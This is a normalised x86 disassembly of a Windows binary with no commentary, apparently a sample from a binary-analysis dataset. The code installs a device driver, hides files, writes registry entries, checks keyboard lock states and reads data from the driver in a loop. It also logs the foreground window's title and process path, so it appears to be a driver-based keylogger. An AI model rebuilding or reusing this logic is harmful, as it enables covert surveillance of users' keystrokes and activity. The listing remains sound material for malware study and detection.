call sub_4010b0
lea eax [ esp + 0xa8 ]
mov edx eax
mov edi edi
call sub_4040f0
add esp 0x10
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
lea edi [ esp + 0x120 ]
sub eax edx
add edi 0xffffffff
mov cl [ edi + 0x1 ]
add edi 0x1
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0xec ]
[ edi ] [ esi ]
mov ecx eax
mov dl [ eax ]
add eax 0x1
test dl dl
jne r-xdata
lea edi [ esp + 0x120 ]
sub eax ecx
mov esi ecx
add edi 0xffffffff
nop
mov cl [ edi + 0x1 ]
add edi 0x1
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx r--data
lea edx [ esp + 0xa8 ]
call sub_4010b0
lea eax [ esp + 0xa8 ]
mov ecx eax
mov dl [ eax ]
add eax 0x1
test dl dl
jne r-xdata
lea edi [ esp + 0x120 ]
sub eax ecx
mov esi ecx
add edi 0xffffffff
lea esp [ esp ]
mov cl [ edi + 0x1 ]
add edi 0x1
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ esp + 0xec ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call j_sub_40f8d1
push eax
call sub_40fb49
add esp 0x8
push 0x1042
lea ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0x128 ]
push edx
call [ OpenFile@IAT ]
mov [ rw-data ] eax
lea eax [ esp + 0x120 ]
push eax
call [ GetFileAttributesA@IAT ]
or eax 0x2
push eax
lea ecx [ esp + 0x124 ]
push ecx
call [ SetFileAttributesA@IAT ]
cmp [ rw-data ] 0xffffffff
je r-xdata
sub_4044c0
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebp
push esi
push edi
push 0x0
lea eax [ esp + 0x30 ]
push eax
mov edi ecx
call [ SetupDiCreateDeviceInfoList@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x1
push 0x0
push 0x0
mov esi eax
lea edx [ esp + 0x3c ]
push edx
lea eax [ esp + 0x50 ]
push eax
push esi
mov [ esp + 0x2c ] 0x1c
call [ SetupDiCreateDeviceInfoA@IAT ]
test eax eax
mov ebp [ GetLastError@IAT ]
je r-xdata
call ebp
push esi
mov edi eax
call [ SetupDiDestroyDeviceInfoList@IAT ]
push edi
call [ SetLastError@IAT ]
mov ecx [ esp + 0x5c ]
xor eax eax
test edi edi
pop edi
pop esi
sete al
pop ebp
xor ecx esp
call sub_40f589
add esp 0x58
retn
push r--data
call [ lstrlenA@IAT ]
add eax 0x2
push eax
push r--data
push 0x1
lea ecx [ esp + 0x1c ]
push ecx
push esi
call [ SetupDiSetDeviceRegistryPropertyA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x10 ]
push edx
push esi
push 0x19
call [ SetupDiCallClassInstaller@IAT ]
test eax eax
je r-xdata
push ebx
push 0x1
push edi
push r--data
push 0x0
call UpdateDriverForPlugAndPlayDevicesA
test eax eax
jne r-xdata
call ebp
mov edi eax
lea eax [ esp + 0x10 ]
push eax
push esi
push 0x5
call [ SetupDiCallClassInstaller@IAT ]
push edi
call [ SetLastError@IAT ]
sub_4045a0
push esi
call [ GetForegroundWindow@IAT ]
mov esi [ FindWindowExA@IAT ]
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
xor eax eax
pop esi
retn
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
push edi
push 0xff
push 0xd
push eax
mov [ edi ] 0x0
call [ SendMessageA@IAT ]
mov eax 0x1
pop esi
retn
sub_404620
push esi
call [ GetForegroundWindow@IAT ]
mov esi [ FindWindowExA@IAT ]
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
xor eax eax
pop esi
retn
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
push edi
push 0xff
push 0xd
push eax
mov [ edi ] 0x0
call [ SendMessageA@IAT ]
mov eax 0x1
pop esi
retn
sub_4046b0
push esi
call [ GetForegroundWindow@IAT ]
mov esi [ FindWindowExA@IAT ]
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
xor eax eax
pop esi
retn
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
push 0x0
push r--data
push 0x0
push eax
call esi
test eax eax
jbe r-xdata
push edi
push 0xff
push 0xd
push eax
mov [ edi ] 0x0
call [ SendMessageA@IAT ]
mov eax 0x1
pop esi
retn
sub_404720
sub esp 0x308
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x304 ] eax
push esi
push edi
mov edi ecx
call [ GetForegroundWindow@IAT ]
mov esi eax
push esi
call [ GetParent@IAT ]
push esi
call [ GetTopWindow@IAT ]
lea eax [ esp + 0x8 ]
push eax
push esi
call [ GetWindowThreadProcessId@IAT ]
mov ecx [ esp + 0x8 ]
push 0x100
lea edx [ esp + 0x110 ]
push 0x0
push edx
mov [ edi ] ecx
call sub_4109d0
add esp 0xc
push 0x100
lea eax [ esp + 0x110 ]
push eax
push esi
call [ GetWindowTextA@IAT ]
test eax eax
jle r-xdata
push 0x100
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
call sub_4109d0
add esp 0xc
push 0x100
lea edx [ esp + 0x10 ]
push edx
push esi
call [ GetWindowModuleFileNameA@IAT ]
test eax eax
jle r-xdata
lea eax [ esp + 0x10c ]
lea edx [ edi + 0x104 ]
mov ecx eax
sub edx ecx
mov edx [ esp + 0x8 ]
push edx
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x210 ]
push r--data
push ecx
call sub_40f598
lea eax [ esp + 0x18 ]
lea edx [ edi + 0x4 ]
mov ecx eax
add esp 0xc
sub edx ecx
mov cl [ eax ]
mov [ edx + eax ] cl
add eax 0x1
test cl cl
jne r-xdata
lea edx [ esp + 0x10c ]
push edx
lea eax [ esp + 0x210 ]
push r--data
push eax
call sub_40f598
add esp 0xc
add edi 0x204
call sub_4045a0
test eax eax
jne r-xdata
push 0x100
lea eax [ esp + 0x10 ]
push eax
push 0x0
push esi
call GetModuleFileNameExA
test eax eax
jbe r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
add eax 0x1
test cl cl
jne r-xdata
jmp r-xdata
mov ecx [ esp + 0x30c ]
pop edi
pop esi
xor ecx esp
mov eax 0x1
call sub_40f589
add esp 0x308
retn
call sub_404620
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
lea ecx [ esp + 0xc ]
push ecx
lea edx [ esp + 0x210 ]
push r--data
push edx
call sub_40f598
lea eax [ esp + 0x18 ]
lea edx [ edi + 0x4 ]
mov ecx eax
add esp 0xc
sub edx ecx
call sub_4046b0
mov cl [ eax ]
mov [ edx + eax ] cl
add eax 0x1
test cl cl
jne r-xdata
sub_4048d0
sub esp 0x10c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x104 ] eax
push esi
push edi
mov esi ecx
mov edi edx
call sub_404720
mov eax [ esi ]
cmp eax [ edi ]
je r-xdata
mov ecx [ esp + 0x10c ]
pop edi
pop esi
xor ecx esp
call sub_40f589
add esp 0x10c
retn
lea ecx [ esp + 0x8 ]
push r--data
push ecx
call sub_40f598
push 0x0
lea edx [ esp + 0x14 ]
push 0x0
push edx
call sub_4041d0
add esp 0x14
push 0x1
push 0x0
push r--data
call sub_4041d0
mov eax [ esi ]
add esp 0xc
push eax
lea ecx [ esi + 0x4 ]
push ecx
lea edx [ esi + 0x104 ]
push edx
lea eax [ esp + 0x14 ]
push r--data
push eax
call sub_40f598
add esp 0x14
push 0x0
lea ecx [ esp + 0xc ]
push 0x0
push ecx
call sub_4041d0
add esp 0xc
lea edx [ esi + 0x204 ]
push edx
lea eax [ esp + 0xc ]
push r--data
push eax
call sub_40f598
add esp 0xc
push 0x0
lea ecx [ esp + 0xc ]
push 0x0
push ecx
call sub_4041d0
mov ecx 0xc1
add esp 0xc
[ edi ] [ esi ]
sub_4049b0
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x84 ] eax
mov ecx r--data
lea edx [ esp + 0x4 ]
call sub_4010b0
lea eax [ esp ]
push eax
push 0x20019
push 0x0
lea ecx [ esp + 0x10 ]
push ecx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x84 ]
xor ecx esp
xor eax eax
call sub_40f589
add esp 0x88
retn
mov edx [ esp ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
mov ecx [ esp + 0x84 ]
xor ecx esp
call sub_40f589
add esp 0x88
retn
sub_404a30
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x84 ] eax
mov ecx r--data
lea edx [ esp + 0x4 ]
call sub_4010b0
lea eax [ esp ]
push eax
push 0x20019
push 0x0
lea ecx [ esp + 0x10 ]
push ecx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x84 ]
xor ecx esp
xor eax eax
call sub_40f589
add esp 0x88
retn
mov edx [ esp ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
mov ecx [ esp + 0x84 ]
xor ecx esp
call sub_40f589
add esp 0x88
retn
sub_404ab0
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x84 ] eax
mov ecx r--data
lea edx [ esp + 0x4 ]
call sub_4010b0
lea eax [ esp ]
push eax
push 0x20019
push 0x0
lea ecx [ esp + 0x10 ]
push ecx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x84 ]
xor ecx esp
xor eax eax
call sub_40f589
add esp 0x88
retn
mov edx [ esp ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
mov ecx [ esp + 0x84 ]
xor ecx esp
call sub_40f589
add esp 0x88
retn
sub_404b30
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x84 ] eax
mov ecx r--data
lea edx [ esp + 0x4 ]
call sub_4010b0
lea eax [ esp ]
push eax
push 0x20019
push 0x0
lea ecx [ esp + 0x10 ]
push ecx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x84 ]
xor ecx esp
xor eax eax
call sub_40f589
add esp 0x88
retn
mov edx [ esp ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
mov ecx [ esp + 0x84 ]
xor ecx esp
call sub_40f589
add esp 0x88
retn
sub_404bb0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xfcc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xfc8 ] eax
mov eax [ r--data ]
mov ecx [ r--data ]
mov edx [ r--data ]
push ebx
mov [ esp + 0x6c0 ] eax
mov al [ r--data ]
push esi
push edi
mov [ esp + 0x6cc ] ecx
mov [ esp + 0x6d0 ] edx
mov [ esp + 0x6d4 ] al
call sub_404b30
call sub_404ab0
call sub_4049b0
call sub_404a30
push 0xff
lea ecx [ esp + 0x9d5 ]
push 0x0
push ecx
mov [ esp + 0x9dc ] 0x0
call sub_4109d0
add esp 0xc
push 0xff
lea edx [ esp + 0x755 ]
push 0x0
push edx
mov [ esp + 0x75c ] 0x0
call sub_4109d0
add esp 0xc
push 0x100
lea eax [ esp + 0x9d4 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edi [ esp + 0x750 ]
lea esi [ esp + 0x9d0 ]
call sub_404160
lea ecx [ esp + 0x20 ]
push ecx
call [ GetLocalTime@IAT ]
push 0x304
lea edx [ esp + 0x3c4 ]
push 0x0
push edx
call sub_4109d0
add esp 0xc
push 0x304
lea eax [ esp + 0xbc ]
push 0x0
push eax
call sub_4109d0
movzx ecx [ esp + 0x36 ]
movzx edx [ esp + 0x34 ]
movzx eax [ esp + 0x32 ]
add esp 0xc
push ecx
movzx ecx [ esp + 0x26 ]
push edx
push eax
push ecx
lea edx [ esp + 0x72c ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x18
xor eax eax
mov cl [ esp + eax + 0x750 ]
mov [ esp + eax + 0x850 ] cl
add eax 0x1
test cl cl
jne r-xdata
lea edi [ esp + 0x850 ]
add edi 0xffffffff
mov al [ edi + 0x1 ]
add edi 0x1
test al al
jne r-xdata
mov ax [ r--data ]
mov ecx r--data
lea edx [ esp + 0x6d8 ]
mov [ edi ] ax
call sub_4010b0
lea eax [ esp + 0x6d8 ]
mov edx eax
mov edi edi
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
lea edi [ esp + 0x850 ]
sub eax edx
add edi 0xffffffff
mov cl [ edi + 0x1 ]
add edi 0x1
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0x71c ]
[ edi ] [ esi ]
mov ecx eax
mov dl [ eax ]
add eax 0x1
test dl dl
jne r-xdata
lea edi [ esp + 0x850 ]
sub eax ecx
mov esi ecx
add edi 0xffffffff
nop
mov cl [ edi + 0x1 ]
add edi 0x1
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx r--data
lea edx [ esp + 0x6d8 ]
call sub_4010b0
lea eax [ esp + 0x6d8 ]
mov ecx eax
mov dl [ eax ]
add eax 0x1
test dl dl
jne r-xdata
lea edi [ esp + 0x850 ]
sub eax ecx
mov esi ecx
add edi 0xffffffff
lea esp [ esp ]
mov cl [ edi + 0x1 ]
add edi 0x1
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x71c ]
push ecx
call j_sub_40f8d1
add esp 0x4
push eax
call sub_40fb49
mov esi [ CreateFileA@IAT ]
add esp 0x4
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0xc0000000
lea edx [ esp + 0x6e0 ]
push edx
call esi
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push 0x1042
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x858 ]
push edx
call [ OpenFile@IAT ]
mov [ rw-data ] eax
lea eax [ esp + 0x850 ]
push eax
call [ GetFileAttributesA@IAT ]
or eax 0x2
push eax
lea ecx [ esp + 0x854 ]
push ecx
call [ SetFileAttributesA@IAT ]
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_404040
test eax eax
jne r-xdata
mov ecx [ esp + 0xfd4 ]
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_40f589
mov esp ebp
pop ebp
retn 0x4
call [ GetTickCount@IAT ]
lea edi [ esp + 0x750 ]
mov [ rw-data ] eax
add edi 0xffffffff
push 0x100
lea ecx [ esp + 0xad4 ]
push ecx
call [ GetSystemDirectoryA@IAT ]
lea eax [ esp + 0xad0 ]
add eax 0xffffffff
lea esp [ esp ]
lea ecx [ esp + 0x750 ]
call sub_401240
lea ecx [ esp + 0x750 ]
call sub_401370
lea eax [ esp + 0xbd0 ]
push eax
push 0x400
mov [ esp + 0x24 ] 0x0
call [ GetCurrentDirectoryA@IAT ]
lea eax [ esp + 0xbd0 ]
add eax ebx
mov al [ edi + 0x1 ]
add edi 0x1
test al al
jne r-xdata
mov dx [ r--data ]
lea eax [ esp + 0x750 ]
mov [ edi ] dx
add eax 0xffffffff
mov cl [ eax + 0x1 ]
add eax 0x1
test cl cl
jne r-xdata
mov edx [ r--data ]
mov ecx [ r--data ]
mov [ eax ] edx
mov dl [ r--data ]
mov [ eax + 0x4 ] ecx
lea ecx [ esp + 0xad0 ]
mov [ eax + 0x8 ] dl
call sub_401370
mov ecx r--data
lea edx [ esp + 0x950 ]
mov [ esp + 0x14 ] 0x1
call sub_4010b0
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x954 ]
push ecx
push 0x80000002
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + 0x1 ]
add eax 0x1
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] edx
mov dx [ r--data ]
mov [ eax + 0x8 ] ecx
lea ebx [ esp + 0x1c ]
lea ecx [ esp + 0xbd0 ]
mov [ eax + 0xc ] dx
call sub_4044c0
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0xc0000000
lea eax [ esp + 0x6e0 ]
push eax
call esi
mov ebx eax
mov cl [ eax + 0x1 ]
add eax 0x1
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov edx [ r--data ]
mov esi [ DeleteFileA@IAT ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] edx
mov dl [ r--data ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] dl
lea eax [ esp + 0x750 ]
push eax
call esi
lea eax [ esp + 0x750 ]
lea edx [ eax + 0x1 ]
mov esi [ RegSetValueExA@IAT ]
push 0x4
lea edx [ esp + 0x18 ]
push edx
push 0x4
push eax
mov eax [ esp + 0x20 ]
push r--data
push eax
call esi
mov edx [ esp + 0x10 ]
push 0x4
lea ecx [ esp + 0x18 ]
push ecx
push 0x4
push 0x0
push r--data
push edx
call esi
mov eax [ esp + 0x10 ]
push eax
call [ RegCloseKey@IAT ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
mov [ esp + eax + 0x74c ] cl
lea eax [ esp + 0x750 ]
add eax 0xffffffff
mov cl [ eax + 0x1 ]
add eax 0x1
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov dl [ r--data ]
mov [ eax ] ecx
mov [ eax + 0x4 ] dl
lea eax [ esp + 0x750 ]
push eax
call esi
push 0x0
push 0x0
push r--data
call sub_4041d0
add esp 0xc
call sub_403b60
push 0x0
push 0x0
push r--data
call sub_4041d0
add esp 0xc
call sub_403ea0
call sub_401f10
call sub_402fd0
mov esi [ GetKeyState@IAT ]
push 0x90
call esi
test al 0x1
je r-xdata
push 0x14
call esi
test al 0x1
je r-xdata
mov [ rw-data ] 0x1
push 0x0
lea ecx [ esp + 0x1c ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x220004
push ebx
call [ DeviceIoControl@IAT ]
xor edi edi
lea esp [ esp ]
mov [ rw-data ] 0x1
push 0x64
call [ Sleep@IAT ]
lea edx [ esp + 0x3c0 ]
lea ecx [ esp + 0xb8 ]
call sub_4048d0
push 0x0
lea edx [ esp + 0x1c ]
push edx
push 0x1145e0
push rw-data
push 0x0
push 0x0
push 0x220000
push ebx
call [ DeviceIoControl@IAT ]
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov esi rw-data
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x46c
cmp esi rw-data
jl r-xdata
sub eax 0x1
jne r-xdata
jmp r-xdata
mov edx [ esi + 0xc ]
cmp edx 0xa
jne r-xdata
mov eax [ esi + 0x10 ]
cmp eax 0x64
mov ecx [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
cmp edi 0x1
jne r-xdata
cmp ecx 0x35
jne r-xdata
lea ecx [ esi + 0x1c ]
push ecx
push eax
call sub_401700
add esp 0x8
jmp r-xdata
cmp eax 0x60
jne r-xdata
cmp eax 0x60
jne r-xdata
mov edi 0x1
jmp r-xdata
test ecx ecx
jle r-xdata
xor edi edi
jmp r-xdata
test edx edx
jne r-xdata
test edi edi
jne r-xdata
push ecx
call sub_4014a0
add esp 0x4
sub_405230
sub esp 0x48
push r--data
push 0x0
push 0x0
call [ CreateMutexA@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
push esi
push 0x2
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] 0x0
call [ GetStockObject@IAT ]
push 0x7f00
push 0x0
mov [ esp + 0x48 ] eax
call [ LoadCursorA@IAT ]
push 0x7f00
push 0x0
mov [ esp + 0x44 ] eax
call [ LoadIconA@IAT ]
mov esi [ esp + 0x50 ]
mov [ esp + 0x38 ] eax
lea eax [ esp + 0x24 ]
push eax
mov [ esp + 0x38 ] esi
mov [ esp + 0x2c ] sub_405370
mov [ esp + 0x4c ] r--data
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x28 ] 0x3
call [ RegisterClassA@IAT ]
push 0x0
push esi
push 0x0
push 0x0
push 0x80000000
push 0x80000000
push 0x80000000
push 0x80000000
push 0xcf0000
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
lea ecx [ esp + 0x4 ]
push ecx
push 0x0
push 0x0
push sub_404bb0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov esi [ GetMessageA@IAT ]
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x14 ]
push edx
call esi
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
mov eax [ esp + 0x10 ]
pop esi
add esp 0x48
retn 0x10
push ebx
mov ebx [ DispatchMessageA@IAT ]
push edi
mov edi [ TranslateMessage@IAT ]
xor eax eax
add esp 0x48
retn 0x10
lea eax [ esp + 0x10 ]
push eax
call edi
lea ecx [ esp + 0x10 ]
push ecx
call ebx
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x1c ]
push edx
call esi
test eax eax
jne r-xdata
pop edi
pop ebx
sub_405370
mov ecx [ esp + 0x8 ]
mov eax ecx
sub eax 0x2
je r-xdata
push 0x0
call [ PostQuitMessage@IAT ]
xor eax eax
retn 0x10
sub eax 0xf
je r-xdata
mov eax 0x1
retn 0x10
mov [ esp + 0x8 ] ecx
jmp [ DefWindowProcA@IAT ]
sub_4053df
push esi
push edi
mov edi [ esp + 0xc ]
jmp r-xdata
push edi
call sub_40f80e
mov esi eax
test esi esi
pop ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
retn
push edi
call eax
test eax eax
pop ecx
je r-xdata
sub_405422
push ebp
mov ebp esp
sub esp 0x208
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx ]
lea edx [ ebp - 0x208 ]
push edx
push 0x200
lea edx [ ebp - 0x204 ]
push edx
call [ eax + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push [ ebp - 0x208 ]
lea eax [ ebp - 0x204 ]
push [ ebp + 0x8 ]
push eax
call sub_4071fc
jmp r-xdata
push [ ebp - 0x208 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40722d
mov [ ebp + 0xc ] 0xf020
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f589
leave
retn 0x8
sub_4054a6
push esi
mov esi ecx
push 0x80
lea eax [ esi + 0x14 ]
push eax
push [ esi + 0x94 ]
mov [ esi + 0xc ] 0x1
call sub_407282
neg eax
sbb eax eax
neg eax
mov [ esi + 0x10 ] eax
pop esi
retn
sub_405503
push 0x4
mov eax sub_420c69
call sub_41021d
push 0x104
call sub_4072e4
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_4102bc
retn
call sub_407807
sub_405574
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
xor ebx ebx
cmp edi ebx
mov esi ecx
je r-xdata
xor eax eax
cmp [ esp + 0x14 ] ebx
je r-xdata
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
mov [ eax ] ebx
cmp [ esi + 0x10 ] ebx
je r-xdata
call sub_4054a6
mov [ edi ] bl
push 0xffffffff
lea eax [ esi + 0x14 ]
push eax
push [ esp + 0x1c ]
push edi
call sub_405532
add esp 0x10
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0xc
mov eax [ esi + 0x10 ]
jmp r-xdata
sub_405643
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LoadResource@IAT ]
test eax eax
jne r-xdata
push esi
push eax
call [ LockResource@IAT ]
mov esi eax
test esi esi
je r-xdata
pop ebp
retn
xor eax eax
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SizeofResource@IAT ]
mov ecx [ ebp + 0x10 ]
add eax esi
and ecx 0xf
jbe r-xdata
pop esi
pop ebp
retn
cmp esi eax
jb r-xdata
cmp esi eax
jae r-xdata
mov ax [ esi ]
neg ax
sbb eax eax
and eax esi
dec ecx
movzx edx [ esi ]
lea esi [ esi + edx * 2 + 0x2 ]
jne r-xdata
sub_40569f
mov eax [ esp + 0x8 ]
shr eax 0x4
inc eax
movzx eax ax
push 0x6
push eax
push [ esp + 0xc ]
call [ FindResourceA@IAT ]
test eax eax
jne r-xdata
push [ esp + 0x8 ]
push eax
push [ esp + 0xc ]
call sub_405643
add esp 0xc
retn
retn
sub_4056e8
push 0x14
push r--data
call sub_4106dc
xor ebx ebx
mov [ ebp - 0x20 ] ebx
lea eax [ ebp - 0x20 ]
push eax
call sub_407eab
push [ eax + 0x80 ]
call sub_4077d7
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] ebx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405741
mov eax [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
call sub_410721
retn
sub_405741
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] ebx
sete al
mov esi eax
cmp esi ebx
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push ebx
call sub_4077c7
cmp esi ebx
je r-xdata
sub_4057e7
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
mov eax [ esi ]
sub eax 0x10
cmp [ eax + 0x8 ] edx
mov ecx [ eax ]
jge r-xdata
call sub_4057dc
test edx edx
jle r-xdata
push edi
mov edi [ ecx ]
push 0x1
push edx
push eax
call [ edi + 0x8 ]
test eax eax
pop edi
jne r-xdata
add eax 0x10
mov [ esi ] eax
pop esi
retn 0x4
sub_40581b
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
push esi
mov esi ecx
jne r-xdata
push 0x0
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push [ esi + 0xc ]
call [ GetLastError@IAT ]
push eax
call sub_4082be
pop esi
pop ebp
retn 0x8
sub_40585b
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
mov esi ecx
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push 0x0
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
push [ esi + 0xc ]
call [ GetLastError@IAT ]
push eax
call sub_4082be
push [ esi + 0xc ]
push 0xffffffff
push 0xd
call sub_408278
sub_4058a6
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push esi
push [ ebp + 0x10 ]
mov esi ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
leave
retn 0xc
push edi
mov edi [ GetLastError@IAT ]
call edi
test eax eax
je r-xdata
pop edi
push [ esi + 0xc ]
call edi
push eax
call sub_4082be
sub_4058f7
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push 0x1
xor eax eax
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
leave
retn
push edi
mov edi [ GetLastError@IAT ]
call edi
test eax eax
je r-xdata
pop edi
push [ esi + 0xc ]
call edi
push eax
call sub_4082be
sub_405941
push esi
mov esi ecx
